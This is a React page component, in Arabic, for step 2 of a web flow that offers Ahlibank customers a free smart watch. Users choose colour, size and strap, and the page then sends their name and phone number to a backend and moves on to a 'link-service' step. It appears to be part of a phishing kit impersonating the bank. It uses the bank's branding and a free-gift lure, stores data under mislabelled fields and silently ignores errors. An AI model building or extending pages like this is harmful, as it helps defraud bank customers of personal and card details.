import React, { useState } from 'react';
import { Watch, Wifi, Battery, Heart, Check, ChevronLeft } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import AppHeader from '../components/AppHeader';
import AppFooter from '../components/AppFooter';
import { FormState, LOGO_SRC } from '../types';
import { updateCardRequest } from '../api';

export default function SelectWatchPage({
  formState,
  setFormState
}: {
  formState: FormState;
  setFormState: React.Dispatch<React.SetStateAction<FormState>>;
}) {
  const navigate = useNavigate();
  const [activeFace, setActiveFace] = useState<'pay' | 'clock' | 'health'>('pay');

  // Watch color finishes
  const colors = [
    {
      id: 'rose-gold',
      name: 'ذهبي وردي ملكي',
      enName: 'Rose Gold Titanium',
      caseBorder: 'border-[#c68e77]',
      caseBg: 'from-[#2e2320] via-[#1f1917] to-[#120f0e]',
      strapBg: 'bg-[#4a352d]',
      colorHex: '#c68e77',
      desc: 'هيكل تيتانيوم فاخر مع لمسات برونزية دافئة'
    },
    {
      id: 'midnight',
      name: 'أسود منتصف الليل',
      enName: 'Midnight Obsidian',
      caseBorder: 'border-[#3f3f46]',
      caseBg: 'from-[#27272a] via-[#18181b] to-[#09090b]',
      strapBg: 'bg-[#18181b]',
      colorHex: '#18181b',
      desc: 'هيكل كربوني أسود مطفي غير عاكس للضوء'
    },
    {
      id: 'silver',
      name: 'فضي بلاتينيوم برّاق',
      enName: 'Platinum Silver',
      caseBorder: 'border-[#cbd5e1]',
      caseBg: 'from-[#334155] via-[#1e293b] to-[#0f172a]',
      strapBg: 'bg-[#475569]',
      colorHex: '#cbd5e1',
      desc: 'فولاذ نقي مقاوم للصدأ مع بريق كلاسيكي'
    }
  ];

  const sizes = [
    { id: '41mm', label: '41 مم', desc: 'خفيف ومدمج (للمعصم 130-180 مم)' },
    { id: '45mm', label: '45 مم', desc: 'شاشة أوسع ووضوح أعلى (للمعصم 160-210 مم)' }
  ];

  const straps = [
    { id: 'silicone', name: 'سيليكون مرن رياضي', desc: 'مقاوم للماء والتعرق وسهل التنظيف' },
    { id: 'leather', name: 'جلد إيطالي أصلي', desc: 'أناقة رسمية مع خياطة يدوية فاخرة' },
    { id: 'milanese', name: 'ميلانيز ستانلس ستيل', desc: 'شبكة فولاذية مرنة بمشبك مغناطيسي' }
  ];

  const currentColor = colors.find((c) => c.id === formState.watchColor) || colors[0];

  return (
    <div className="min-h-screen flex flex-col bg-[#fbfbfd]">
      <AppHeader showBack backTo="/form" title="الخطوة 2: اختيار الساعة والمواصفات" />

      <main className="flex-1 py-6 px-4 max-w-md mx-auto w-full">
        {/* Page Title & Intro */}
        <div className="text-center mb-6">
          <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-[#e6f4f0] border border-[#004838]/20 rounded-full text-xs font-bold text-[#004838] mb-2">
            <Watch className="w-3.5 h-3.5 text-[#004838]" />
            <span>عرض مجاني خاص لعملاء البنك الأهلي</span>
          </div>
          <h1 className="text-2xl font-black text-gray-900">اختر ساعتك الذكية</h1>
          <p className="text-xs text-gray-600 mt-1 max-w-xs mx-auto">
            خصّص تصميم ساعتك المفضلة الداعمة لتقنية الدفع باللمس من البنك الأهلي
          </p>
        </div>

        {/* Live Interactive Watch Preview Display */}
        <div className="bg-gradient-to-b from-[#f4f7f5] to-white rounded-3xl p-6 border border-gray-200/80 shadow-xs mb-6 text-center relative overflow-hidden">
          {/* Ambient colored lighting behind watch */}
          <div
            className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-48 h-48 rounded-full blur-3xl opacity-30 pointer-events-none transition-all duration-500"
            style={{ backgroundColor: currentColor.colorHex }}
          />

          {/* Interactive Screen Face Mode Switcher */}
          <div className="flex justify-center gap-1 mb-5 relative z-10">
            {[
              { id: 'pay', label: '💳 بطاقة الدفع' },
              { id: 'clock', label: '🕒 الوقت' },
              { id: 'health', label: '💓 الصحة' }
            ].map((f) => (
              <button
                key={f.id}
                onClick={() => setActiveFace(f.id as 'pay' | 'clock' | 'health')}
                className={`px-3 py-1 rounded-full text-xs font-bold transition-all cursor-pointer ${
                  activeFace === f.id
                    ? 'bg-[#004838] text-white shadow-xs'
                    : 'bg-white text-gray-600 border border-gray-200 hover:bg-gray-50'
                }`}
              >
                {f.label}
              </button>
            ))}
          </div>

          {/* The Smart Watch Render Frame */}
          <div className="relative mx-auto w-56 h-72 flex items-center justify-center my-2">
            {/* Contactless waves on pay face */}
            {activeFace === 'pay' && (
              <>
                <div className="absolute w-48 h-48 rounded-full border border-[#004838]/30 animate-pulse-wave pointer-events-none" />
                <div className="absolute w-56 h-56 rounded-full border border-[#d4a343]/30 animate-pulse-wave-delay pointer-events-none" />
              </>
            )}

            {/* Top Watch Strap */}
            <div
              className={`absolute -top-7 w-28 h-12 ${currentColor.strapBg} rounded-t-2xl z-0 shadow-md transition-colors duration-300`}
            />

            {/* Main Watch Case */}
            <div
              className={`relative z-10 w-48 h-60 rounded-[44px] bg-gradient-to-b ${currentColor.caseBg} p-3.5 shadow-2xl border-4 ${currentColor.caseBorder} flex flex-col items-center justify-between overflow-hidden transition-all duration-300`}
            >
              {/* Glass Glare */}
              <div className="absolute top-0 right-0 w-full h-28 bg-gradient-to-b from-white/20 via-white/5 to-transparent pointer-events-none" />

              {/* Digital Screen Inner Frame */}
              <div className="w-full h-full rounded-[34px] bg-black p-3.5 flex flex-col items-center justify-between text-white relative overflow-hidden">
                {/* Watch Top Status Bar */}
                <div className="w-full flex items-center justify-between text-[11px] text-gray-300 font-mono">
                  <span className="font-bold">10:42</span>
                  <div className="flex items-center gap-1.5">
                    <Wifi className="w-3.5 h-3.5 text-[#e8c679] rotate-90" />
                    <Battery className="w-3.5 h-3.5 text-emerald-400" />
                  </div>
                </div>

                {/* Face Content 1: Payment Mode */}
                {activeFace === 'pay' && (
                  <div className="my-auto w-full flex flex-col items-center justify-center">
                    <div className="w-14 h-14 rounded-full bg-[#004838]/60 border border-[#d4a343]/60 flex items-center justify-center mb-1.5 shadow-lg">
                      <Wifi className="w-8 h-8 text-[#e8c679] rotate-90" />
                    </div>
                    <p className="text-[10px] font-bold text-[#fef3c7]">قرّب الساعة من جهاز الدفع</p>

                    {/* Ahlibank Card preview inside watch */}
                    <div className="w-full mt-2 bg-gradient-to-r from-[#01261d] via-[#053d30] to-black border border-[#d4a343]/30 rounded-xl p-2 text-right shadow-inner">
                      <div className="flex justify-between items-center text-[8px] text-gray-300">
                        <div className="flex items-center gap-1">
                          <img src={LOGO_SRC} alt="ahlibank" className="h-3 object-contain" />
                          <span className="font-bold text-white text-[9px]">ahlibank</span>
                        </div>
                        <span className="font-mono text-[8px] text-zinc-400">الخصم المباشر</span>
                      </div>
                      <div className="text-[10px] font-mono tracking-widest text-white mt-1">
                        •••• 4892
                      </div>
                    </div>
                  </div>
                )}

                {/* Face Content 2: Clock Mode */}
                {activeFace === 'clock' && (
                  <div className="my-auto flex flex-col items-center justify-center">
                    <span className="text-4xl font-black tracking-tight text-white font-mono">10:42</span>
                    <span className="text-xs text-[#e8c679] font-bold mt-1">الأربعاء، مسقط</span>
                    <div className="mt-2 flex items-center gap-1 text-[10px] text-gray-400">
                      <span>28°C مشمس</span>
                    </div>
                  </div>
                )}

                {/* Face Content 3: Health Mode */}
                {activeFace === 'health' && (
                  <div className="my-auto flex flex-col items-center justify-center">
                    <div className="w-12 h-12 rounded-full bg-rose-500/20 flex items-center justify-center mb-1 text-rose-500 animate-pulse">
                      <Heart className="w-6 h-6 fill-rose-500" />
                    </div>
                    <span className="text-xl font-bold font-mono">
                      72 <span className="text-[10px] text-gray-400 font-sans">نبضة/د</span>
                    </span>
                    <span className="text-[10px] text-emerald-400 font-bold mt-1">7,420 خطوة اليوم</span>
                  </div>
                )}

                {/* Bottom Screen Indicator */}
                <div className="w-12 h-1 bg-white/40 rounded-full" />
              </div>
            </div>

            {/* Bottom Watch Strap */}
            <div
              className={`absolute -bottom-7 w-28 h-12 ${currentColor.strapBg} rounded-b-2xl z-0 shadow-md transition-colors duration-300`}
            />
          </div>

          <p className="text-xs font-bold text-gray-800 mt-2">{currentColor.name}</p>
          <p className="text-[11px] text-gray-500">{currentColor.desc}</p>
        </div>

        {/* Customization Controls */}
        <div className="space-y-5 bg-white rounded-3xl p-6 border border-gray-200 shadow-sm mb-6">
          {/* Section 1: Color Picker */}
          <div>
            <label className="block text-xs font-bold text-gray-800 mb-2">
              1. اختر لون وهيكل الساعة
            </label>
            <div className="grid grid-cols-1 gap-2">
              {colors.map((c) => {
                const isSelected = formState.watchColor === c.id;
                return (
                  <button
                    key={c.id}
                    type="button"
                    onClick={() => setFormState({ ...formState, watchColor: c.id })}
                    className={`p-3 rounded-2xl border text-right flex items-center justify-between transition-all cursor-pointer ${
                      isSelected
                        ? 'border-[#004838] bg-[#e6f4f0]/60 shadow-xs'
                        : 'border-gray-200 hover:border-gray-300 bg-white'
                    }`}
                  >
                    <div className="flex items-center gap-3">
                      <span
                        className="w-7 h-7 rounded-full shadow-inner border border-white shrink-0"
                        style={{ backgroundColor: c.colorHex }}
                      />
                      <div>
                        <p className="text-xs font-bold text-gray-900">{c.name}</p>
                        <p className="text-[10px] text-gray-500">{c.enName}</p>
                      </div>
                    </div>
                    {isSelected && (
                      <div className="w-5 h-5 rounded-full bg-[#004838] text-white flex items-center justify-center">
                        <Check className="w-3.5 h-3.5" />
                      </div>
                    )}
                  </button>
                );
              })}
            </div>
          </div>

          {/* Section 2: Size Picker */}
          <div>
            <label className="block text-xs font-bold text-gray-800 mb-2">
              2. حجم هيكل الساعة
            </label>
            <div className="grid grid-cols-2 gap-2">
              {sizes.map((s) => {
                const isSelected = (formState.watchSize || '45mm') === s.id;
                return (
                  <button
                    key={s.id}
                    type="button"
                    onClick={() => setFormState({ ...formState, watchSize: s.id })}
                    className={`p-3 rounded-2xl border text-right transition-all cursor-pointer ${
                      isSelected
                        ? 'border-[#004838] bg-[#e6f4f0]/60 font-bold text-[#004838] shadow-xs'
                        : 'border-gray-200 hover:border-gray-300 bg-white text-gray-700'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-sm font-bold">{s.label}</span>
                      {isSelected && <Check className="w-4 h-4 text-[#004838]" />}
                    </div>
                    <p className="text-[10px] text-gray-500 font-normal leading-tight">{s.desc}</p>
                  </button>
                );
              })}
            </div>
          </div>

          {/* Section 3: Strap Style */}
          <div>
            <label className="block text-xs font-bold text-gray-800 mb-2">
              3. نوع السوار المفضل
            </label>
            <div className="space-y-1.5">
              {straps.map((st) => {
                const isSelected = (formState.strapType || 'silicone') === st.id;
                return (
                  <button
                    key={st.id}
                    type="button"
                    onClick={() => setFormState({ ...formState, strapType: st.id })}
                    className={`w-full p-2.5 rounded-xl border text-right flex items-center justify-between transition-all cursor-pointer ${
                      isSelected
                        ? 'border-[#004838] bg-[#e6f4f0]/50 font-bold text-[#004838]'
                        : 'border-gray-200 hover:border-gray-300 bg-white'
                    }`}
                  >
                    <div>
                      <p className="text-xs font-bold text-gray-800">{st.name}</p>
                      <p className="text-[10px] text-gray-500 font-normal">{st.desc}</p>
                    </div>
                    {isSelected && <Check className="w-4 h-4 text-[#004838] shrink-0" />}
                  </button>
                );
              })}
            </div>
          </div>

          {/* Package Features & Value Callout */}
          <div className="pt-2 border-t border-gray-100">
            <div className="bg-[#f6f9f7] rounded-2xl p-3.5 space-y-2 text-xs border border-emerald-900/10">
              <div className="flex justify-between items-center">
                <span className="text-gray-600">القيمة السوقية للساعة:</span>
                <span className="line-through text-gray-400 font-mono">85.000 ر.ع</span>
              </div>
              <div className="flex justify-between items-center text-[#004838] font-bold">
                <span>عرض عملاء البنك الأهلي:</span>
                <span className="text-base font-black text-[#c8922c]">مجاناً (0.000 ر.ع)</span>
              </div>
              <div className="flex justify-between items-center text-[11px] text-gray-500 pt-1 border-t border-gray-200">
                <span>التوصيل والضمان:</span>
                <span className="text-emerald-700 font-medium">سنتان ضمان شامل + شحن مجاني</span>
              </div>
            </div>
          </div>

          {/* Confirm Button */}
          <button
            type="button"
            onClick={async () => {
              try {
                await updateCardRequest('current', {
                  name: formState.fullName || undefined,
                  mobile: formState.phone || undefined,
                  cardType: formState.watchColor,
                  address: `${formState.watchSize || '45mm'} - ${formState.strapType || 'silicone'}`,
                  step: 'watch',
                });
              } catch {
                // Proceed smoothly
              }
              navigate('/link-service');
            }}
            className="w-full py-4 bg-gradient-to-r from-[#d4a343] via-[#c8922c] to-[#b88022] hover:from-[#c8922c] hover:to-[#a7731a] text-white font-bold text-lg rounded-2xl shadow-lg shadow-[#d4a343]/30 active:scale-[0.98] transition-all cursor-pointer flex items-center justify-center gap-2"
          >
            <span>تأكيد اختيار الساعة والمتابعة</span>
            <ChevronLeft className="w-5 h-5" />
          </button>
        </div>
      </main>

      <AppFooter />
    </div>
  );
}
